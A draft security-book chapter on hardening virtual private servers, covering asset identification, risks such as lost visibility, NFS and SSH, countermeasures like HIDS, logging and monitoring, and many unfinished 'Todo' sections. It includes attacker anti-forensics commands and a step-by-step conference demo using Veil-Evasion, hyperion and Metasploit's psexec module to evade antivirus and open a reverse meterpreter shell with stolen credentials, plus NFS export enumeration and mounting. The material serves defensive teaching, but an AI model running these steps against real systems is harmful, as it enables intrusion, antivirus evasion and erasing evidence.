# VPS {#vps}

![10,000' view of VPS Security](images/10000VPS.gif)

If possible, I usually advocate bringing VPS(s) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have control. A lot of the ideas in this section originated from a blog post of mine on [hardening Debian web servers](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/).

## 1. SSM Asset Identification {#vps-asset-identification}
Take results from [higher level Asset Identification](#asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

* Ownership. At first this may sound strange, but that is because of an assumption you may have that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. Possibly it is just for kicks, possibly it is for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your it as a liability. Both may be correct. In any case, you need to protect your server(s) and in many cases take it to school and teach it how to protect itself. This is covered under the [SSM Countermeasures](#vps-countermeasures) section with items such as HIDS and Logging and Alerting.
* Visibility into and of many things, such as:
  * Disk space
  * Disk IO
  * CPU usage
  * Memory usage
  * File integrity and time stamp changes
  * Which system processes are running
  * System process health and responsiveness
  * Current login sessions
  * What any user is doing on the system currently
  * Network connections
  * Etc
* Taking the confidential business and client information from the "Starting with the 30,000' view" chapter, here we can concretise these concepts into forms such as:
  * Email, Web, Data-store servers and of course the data on them.
  * You could even stretch this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the [Mobile](#mobile) chapter)

This is probably an incomplete list for your domain. I have given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#identify-risks), but for your VPS(s).

* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Windows specific, but does offer some insight into technology agnostic risks and countermeasures.
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-identify-risks-forfeit-control-thus-security}
![](images/ThreatTags/average-widespread-average-severe.png)

In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).

* If you do not own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you are given".
* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It is very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
* What control do you have that if you are data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you will not know about it.
* Your provider may go out of business and you may get little notice of this.
* Providers are outsourcing their outsourced services to several providers deep. They do not even have visibility themselves. Control is lost.
* \> distribution = > attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
* Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?

### Lack of Visibility

As I was writing this section, I realised that visibility is actually an asset (so I went back and added it... actually to several chapters). Without visibility, an attacker can do a lot more damage than they could if you were watching them, or even if you have good auditing capabilities. It is in fact an asset that attackers often try and remove for this very reason.

Any attacker worth their weight will try to cover their tracks as they progress. Once an attacker has shell access to a system, they may:

* Check running processes to make sure that they have not left anything they used to enter still running
* Remove messages in logs related to their break (walk) in
* Same with the shell history file. Or even:  
  `ln /dev/null ~/.bash_history -sf` so that all following history vanishes.
* They may change time stamps on new files with:  
  `touch -r <referenceFile> <fileThatGetsReferenceFileTimeStampsApplied>`  
  Or better is to use the original date-time:

    {linenos=off}
        touch -r <originalFile> <trojanFile>
        mv <trojanFile> <originalFile>

* Make sure any trojan files they drop are the same size as the originals
* Replace `md5sum` so that it contains sums for the files that were replaced including itself. Although if an administrator ran `rpm -V` or `debsums -c` (Debian, Ubuntu) it would not be affected by a modified `md5sum`.

If an attacker wants their actions to be invisible, they may try replacing the likes of `ps`, `pstree`, `top` and possibly `netstat` or `ss` if they are trying to hide network activity from the host.

Taking things further, an attacker may load a kernel module that modifies the `readdir()` call and the `proc` filesystem so that any changes on the file system are untrustworthy, or if going to the length of loading custom modules, everything can be done from kernel space which is invisible until reboot.

Without visibility, an attacker can access your system(s) and, alter, [copy](https://github.com/m57/dnsteal), modify information without you knowing they did it. Even launch DoS attacks without you noticing anything before it is to late.

### Using Components with Known Vulnerabilities

_Todo_

Similar section in network chapter
https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities

### System Compromise {#vps-identify-risks-system-compromise}

_Todo_

This is pretty much a blanket heading. It really needs to be broken down more.

### Windows

#### PSExec {#vps-identify-risks-psexec}
![](images/ThreatTags/average-common-difficult-severe.png)

PSExec was written by Mark Russinovich as part of the Sysinternals tool suite. PSExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a telnet replacement.  
PSExec requires a few things on the target system:

1. The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)
2. File and Print Sharing must be enabled
3. Simple File Sharing must be disabled
4. The Admin$ share (which maps to the Windows directory) must be available and accessible
5. The credentials supplied to the PSExec utility must have permissions to access the Admin$ share

The PSExec executable has a Windows Service image inside which it deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PSExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.

The Metasploit PSExec module (`exploit/windows/smb/psexec`) uses basically the same principle.

{#wdcnz-demo-5}
![](images/HandsOnHack.png)

The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) will provide some additional context and it is probably best to look at it first if you have not already.

You can find the video of how it is played out [here](https://www.youtube.com/watch?v=1EvwwYiMrV4).

I> ## Synopsis
I>
I> This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.  
I> We open a reverse shell from the victim to us using Metasploit.  
I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
I> With this attack you will have had to have obtained the targets username and password or password hash.  
I> We leverage PSExec which expects your binary to be a windows service.
I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.

{icon=bomb}
G> ## The Play
G>
G> Start Veil-Evasion:  
G> `cd /opt/Veil/Veil-Evasion/ && ./Veil-Evasion.py`
G>
G> List the available payloads to encrypt:  
G> `list`
G>
G> Choose a service because we are going to use psexec to install it on the targets box and we want to open a reverse shell:  
G> `use 4`  
G> That is `c/meterpreter/rev_http_service`
G>
G> Set any options here:  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G>
G> Generate the initial payload:  
G> `generate`
G>
G> Give it a name. I just selected the default of "payload".  
G> [Enter]  
G> Exit out of Veil-Evasion.
G>
G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:  
G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
G> We then put the encrypted payload somewhere where Metasploit can access it:  
G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
G> We then tell Metasploit where we have put it.  
G> I created a Metasploit resource file:  
G> `cat ~/demo.rc`
G>
G> `use exploit/windows/smb/psexec`  
G> `set payload windows/meterpreter/reverse_http`  
G> `set lport 8080`  
G> `set lhost <IP address that we are going to be listening on for the reverse shell>`  
G> `set rhost <IP address of target>`  
G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
G> `set smbuser <target username>`  
G> `set smbpass <target password>`  
G> `run`
G>
G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
G> Now we have got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.

{icon=bomb}
G> We now run msfconsole with the resource file as parameter:  
G> `msfconsole -r ~/demo.rc`  
G> and that is enough to evade AV and get our reverse shell.
G>
G> `sessions` will show you the active sessions you have.  
G> To interact with the first one:  
G> `sessions -i 1`
G>
G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)

### Unnecessary/Vulnerable Services

Probe the portmapper on target host where target host is an IP address or a host name:

%% http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#rpc-portmapper

The rpcinfo command with `-p` will list all registered RPC programs. Many RPC programs are vulnerable to a collection of attacks. 

{title="rpcinfo", linenos=off, lang=bash}
    rpcinfo -p <target host> 

{title="rpcinfo results", linenos=off, lang=bash}
    program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100000    4     7    111  portmapper
    100000    3     7    111  portmapper
    100000    2     7    111  portmapper
    100005    1   udp    649  mountd
    100003    2   udp   2049  nfs
    100005    3   udp    649  mountd
    100003    3   udp   2049  nfs
    100024    1   udp    600  status
    100005    1   tcp    649  mountd
    100024    1   tcp    868  status
    100005    3   tcp    649  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100021    0   udp    679  nlockmgr
    100021    0   tcp    875  nlockmgr
    100021    1   udp    679  nlockmgr
    100021    1   tcp    875  nlockmgr
    100021    3   udp    679  nlockmgr
    100021    3   tcp    875  nlockmgr
    100021    4   udp    679  nlockmgr
    100021    4   tcp    875  nlockmgr

This provides lots of jucy information for an attacker to take into the [Vulnerability Searching](#process-and-practises-penetration-testing-vulnerability-searching) stage discussed in the Process and Practises chapter.

#### NFS

If the `mountd` daemon is listed in the output of the above `rpcinfo` command, `showmount -e` command will be useful for listing the NFS server's list of exports.

{title="showmount", linenos=off, lang=bash}
    showmount -e <target host>

{title="showmount results", linenos=off, lang=bash}
    Export list for <target hsot>:
    / (anonymous) # If you're lucky as an attacker, anonymous means anyone can mount.
    / * # means all can mount the exported root directory.
    # Probably because the hosts.allow has ALL:ALL and hosts.deny is blank.
    # Which means all hosts from all domains are permitted access.

NFS is one of those protocols that you need to have some understanding on in order to acheive a level of security sufficient for your target environment.

{title="mount nfs export", linenos=off, lang=bash}
    # Make sure local rpcbind service is running:
    service rpcbind status
    # Should yield [ ok ] rpcbind is running.
    # If not:
    service rpcbind start
    mount -t nfs <target host>:/ /mnt

All going well for the attacker, they will now have your VPS's `/` directory mounted to their `/mnt` directory. If you have not setup NFS properly, they will have full access to your entire file system.

#### SSH

You may remember we did some fingerprinting of the SSH daemon in the Processes and Practises chapter in the [Reconnaissance](#process-and-practises-penetration-testing-reconnaissance) section


_Todo_




## 3. SSM Countermeasures {#vps-countermeasures}
* [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
* [MS Securing Your Web Server](https://msdn.microsoft.com/en-us/library/ff648653.aspx) This is Microsoft specific, but does offer some insight into technology agnostic risks and countermeasures
* [MS Securing Your Application Server](https://msdn.microsoft.com/en-us/library/ff648657.aspx) As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts

### Forfeit Control thus Security {#vps-countermeasures-forfeit-control-thus-security}
![](images/ThreatTags/PreventionEASY.png)

Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. Cloud offerings are often more expensive in monetary terms for medium to large environments.

### Lack of Visibility {#vps-countermeasures-lack-of-visibility}

#### Host Intrusion Detection Systems (HIDS) {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids}
![](images/ThreatTags/PreventionAVERAGE.png)

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/05/30/evaluation-of-host-intrusion-detection-systems-hids/) of a couple of HIDS. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#hids). 

_Todo_ Elaborate

#### Logging and Alerting {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
![](images/ThreatTags/PreventionAVERAGE.png)

_Todo_

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/04/25/web-server-log-management/) of a small collection of logging and alerting offerings. The choice of which candidates to take into the second round came from my [initial evaluation](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#logging-alerting-and-monitoring).

%% Make sure my logging-alerting blog post goes into the attributions chapter also
%% Contact papertrail for some generic dashboard images. This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.

It is very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).

_Todo_ Elaborate on how we set this up.

%% Expand on this from my blog posts
%% You can often see in logs when access has been granted to an entity, when files have been modified or removed.
%% Become familiar with what your logs look like. A good sysadmin can sight logs and quickly see anomalies.
%% Alerting events should also be setup for expected and unexpected actions.
%% In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity. That time stamps are synchronised across your network. That you archive the logs for long enough to be able to diagnose malicious activity and movements across the network.
%% Write up about NTP and use my blog post. Being able to rely on the times of events on different network nodes is essential to making sense of tracking an entities movements.
%% That's why NTP is important.

logrotate

#### Monitoring {#vps-countermeasures-lack-of-visibility-monitoring}
![](images/ThreatTags/PreventionAVERAGE.png)

_Todo_ Show research already performed.

I recently performed an [in-depth evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#the-following-are-better-suited-to-monitoring) of a collection of tools that one of their responsibilities was monitoring and performing actions on your processes and applications.

1. Supervisor [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#supervisor)
2. Monit [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit)  (free and open source) sweet spot: smaller deployments, but I'm sure you could scale it. I love this tool. It is so easy to work with.  
  * [Deep dive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) into Monit. What happens if the process we use to monitor stops working? [Keep Monit Alive](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#keep-monit-alive)
  * File checksum testing
  * File size testing
  * File content testing
  * Filesystem flags testing
3. Passenger [evaluation](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#passenger)
4. [Zabbix](http://www.zabbix.com/) (free and open source) sweet spot: enterprise
5. Nagios (costs money)



##### Statistics Graphing: {#vps-countermeasures-lack-of-visibility-monitoring-statistics-graphing}

This is where collectd and graphite come to the party.

{linenos=off}
        Server1   
       +--------------+
       |              |
    +-<| collectd     |
    |  +--------------+
    |                         Graphing
    v   Server2               Server
    |  +--------------+      +-----------+
    |  |              |      |           |
    +-<| collectd     |      |           |
    |  +--------------+      |           |
    |                        | graphite  |<-+
    v   Server3, etc         +-----------+  |
    |  +--------------+                     |
    |  |              |                     ^
    +-<| collectd     |                     |
    |  +--------------+                     |
    +-------------------->------------------+

This is an excellent set of tools for system instrumentation.  
In the Web Applications chapter we add statsd to the mix to provide application specific statistics.

_Todo_

%% https://www.digitalocean.com/community/tutorials/an-introduction-to-tracking-statistics-with-graphite-statsd-and-collectd

%% graphite
%%  Consists of:
%%     carbon - a daemon that listens for time-series data.
%%     whisper - a simple database library for storing time-series data.
%%     webapp - a (Django) webapp that renders graphs on demand.   
%%  Tools that work with graphite: http://graphite.readthedocs.org/en/latest/tools.html
%%  Useful Graphite posts:
%%     https://kevinmccarthy.org/2013/07/18/10-things-i-learned-deploying-graphite/

%% Configure CollectD to Gather System Metrics for Graphite on Ubuntu: https://www.digitalocean.com/community/tutorials/how-to-configure-collectd-to-gather-system-metrics-for-graphite-on-ubuntu-14-04   
%%   collectd https://collectd.org
%%      Collectd is an agent based system metrics collection tool. An agent is deployed on every host that needs to be monitored.
%%      Can send stats to graphite: https://collectd.org/wiki/index.php/Plugin:Write_Graphite
%%         Other plugins here: https://collectd.org/wiki/index.php/Table_of_Plugins
%%      Plugins for collecting OpenStack metrics: https://github.com/catalyst/collectd-openstack
%%      Nagios, Graphite, Collectd for OpenStack.

%% There is also the RackSpace free Monitoring Agent writen in Lua. Details in NodeUp83_libuv.txt
%% http://www.rackspace.com/cloud/monitoring/features
%% https://luvit.io/blog/iot-relay.html
%% https://www.tomaz.me/2013/11/28/running-luvit-and-rackspace-monitoring-agent-on-raspberry-pi.html

I also looked into the following offerings which cater to providing visibility into many aspects of the applications, services, servers and networks, but none that really address security concerns:

* New Relic (have a free tier)
* Raygun (costs money)

#### File Integrity Checking

_Todo_

The faster you can respond to an attacker modifying system files, the more likely you are to circumvent their attempts.
Ossec provides real-time cheacking.
Stealth provides agentless checking (It runs from another machine), using the checksum programme of your choice that it copies on first run.

_Todo_

### Using Components with Known Vulnerabilities

_Todo_ Patching.

Similar section in network chapter.
https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities

### Windows

#### PSExec {#vps-countermeasures-psexec}

_Todo_: How hard is prevention?

![](images/ThreatTags/Prevention.png)

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1)

### Minimise Attack Surface by [Granular Partitioning](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#partitioning)
![](images/ThreatTags/PreventionAVERAGE.png)

By creating many partitions and [applying the least privileges](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#lock-down-the-mounting-of-partitions) necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to. This is where you play with your `/etc/fstab`

This is a similar concept to tightly [constraining](http://blog.binarymist.net/2012/11/04/sanitising-user-input-from-browser-part-1/#minimising-the-attack-surface) input fields to only be able to accept structured data (names (alpha only) dates, social security numbers, zip codes, email addresses, etc) rather than just leaving the input wide open to be able to enter any text.



### Minimise Attack Surface by Installing [Only what you Need](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#continuing-with-the-install)
![](images/ThreatTags/PreventionVERYEASY.png)

This pretty much goes without saying I think, unless you are setting up a Windows server with "all the stuff" that you have no control over. Which is why I prefer UNIX based servers. I have all the control. If anything goes wrong, it is usually my own fault.

### Review Password Strategies
![](images/ThreatTags/PreventionEASY.png)

Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks you anticipate. Details [here](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#passwords). 

### Disable Remote Root Logins
![](images/ThreatTags/PreventionVERYEASY.png)

There are a handful of files to check & modify for [disabling root logins](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-remote-root-logins).

### [Disable Boot Options](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-boot-options)
![](images/ThreatTags/PreventionVERYEASY.png)

Just another attack vector that should be removed

### Disable, Remove Services. Harden what's left
![](images/ThreatTags/PreventionEASY.png)

There are often a few services you can [disable](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#disable-services-we-dont-need) even on a bare bones Debian install and some that are just easier to [remove](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#remove-services). Then go through the process of [hardening](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#secure-services) what is left. Make sure you test before and after each service you attack. Watch the port being open/closed, etc.

#### NFS

Your distribution of Linux or what ever is installed on your VPS may not have portmap running, if it does, you may not need it. Either way, a simple option is to just not have it running.

If you do need portmap and NFS running, the usual files that will need some configuration will be:

* `/etc/exports`
* `/etc/hosts.allow`
* `/etc/hosts.deny`

_Todo_ detail configuring NFS if NFS is required

%% http://www.tldp.org/HOWTO/NFS-HOWTO/security.html

#### [SSH](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#ssh)
![](images/ThreatTags/PreventionVERYEASY.png)

We covered fingerprinting of SSH in the Processes and Practises chapter under the [Reconnaissance](#process-and-practises-penetration-testing-reconnaissance-service-fingerprinting-other-services) section. Here we will discuss what you can do to harden SSH.

_Todo_

There are a bunch of things you can do to minimise SSH being used as an attack vector.  
Use Key-pairs, Long pass-phrases. Appropriate changes to `sshd_config` file.  
AllowUsers.  
Specify Host(s).  
Consider non default port below 1025 that only root can bind to in order to stop the sshd being swapped.

_Todo_

Cover `/etc/hosts.deny`, `/etc/hosts.allow`

### Docker Containers

_Todo_
%% http://resources.infosecinstitute.com/docker-and-enterprise-security-establishing-best-practices/

### [Schedule Backups](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#scheduled-backups)
![](images/ThreatTags/PreventionEASY.png)

and make sure you can restore from them. Yes it is extra work, but work that will be invaluable if those backups do not restore.  
Also consider setting up automatic updates.

### Host Firewall
![](images/ThreatTags/PreventionEASY.png)

[This](http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#fire-walling) is one of the last things you should look at. In fact, it is not really needed if you have taking the time to remove unnecessary services and harden what is left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress & egress.

## 4. SSM Risks that Solution Causes
> Are there any? If so what are they?

* Just beware that if you are intending to break the infrastructure or even what is running on your VPS(s) if they are hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That is why I usually recommend self hosting.
* Keep in mind: that if you do not break your system(s), someone else will.
* Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure.
* Many of the points I have raised around VPS hardening require maintenance.

### Forfeit Control thus Security

_Todo_

### Lack of Visibility

_Todo_

#### Host Intrusion Detection Systems (HIDS)

_Todo_

#### Logging and Alerting

_Todo_

%% Logging and Alerting is never going to be a complete solution. There is risk that people think that one or two tools mean they are covered from every type of attack.
%% A large array of diverse countermeasures is always going to be required to produce good visibility of your system(s). Even using multiple tools that do similar jobs but take different strategies on how they execute and in-fact from where they run.
%% For example using a file integrity checker that resides on your target server and others that reside on servers somewhere else that run against the target server. An attacker will very often not realise that they are under observation if they can not see the observer running on the machine that they are on.
%% This sort of strategy provides a false sense of self security for the attacker. In a way a similar concept to the honey pot. They may know about a tool operating on the server they are on and even have disabled it, but if you keep the defence in depth mentality, you may just have the upper hand without the attacker being aware of it. This can create perfect ambush.
%% Add defence in depth diagram from CampJS talk again.

#### Monitoring

_Todo_

Over confidence in monitoring tools. For example an attacker could try and replace the configuration files for Monit or the Monit daemon itself, so the following sorts of tests would either not run or return tampered with results:

  * File checksum testing
  * File size testing
  * File content testing
  * Filesystem flags testing

In saying that, if you have an agentless (running from somewhere else) file integrity checker or even several of them running on different machines and as part of their scope are checking Monit, then the attacker is going to have to find the agentless file integrity checker(s) and disable them also without being noticed. This is increasing the level difficulty significantly.

You could and should also have NIDs running on your network which makes this even more likely that an attacker is going to step on a land mine.

_Todo_

#### File Integrity Checking

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

### Windows

_Todo_

#### PSExec

_Todo_

### Minimise Attack Surface by Granular Partitioning

_Todo_

### Minimise Attack Surface by Installing Only what you Need

_Todo_

### Review Password Strategies

_Todo_

### Disable Remote Root Logins

_Todo_

### Harden SSH

_Todo_

### Disable Boot Options

_Todo_

### Disable, Remove Services. Harden what's left

_Todo_

#### NFS

_Todo_

#### SSH

_Todo_

### Schedule Backups

_Todo_

### Host Firewall

_Todo_

## 5. SSM Costs and Trade-offs

### Forfeit Control thus Security

_Todo_

### Lack of Visibility

_Todo_

#### Host Intrusion Detection Systems (HIDS)

_Todo_

#### Logging and Alerting

_Todo_

#### Monitoring

_Todo_

#### File Integrity Checking

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

### Windows

_Todo_

#### PSExec

_Todo_

### Minimise Attack Surface by Granular Partitioning

_Todo_

### Minimise Attack Surface by Installing Only what you Need

_Todo_

### Review Password Strategies

_Todo_

### Disable Remote Root Logins

_Todo_

### Harden SSH

_Todo_

### Disable Boot Options

_Todo_

### Disable, Remove Services. Harden what's left

_Todo_

#### NFS

_Todo_

#### SSH

_Todo_

### Schedule Backups

_Todo_

### Host Firewall

_Todo_
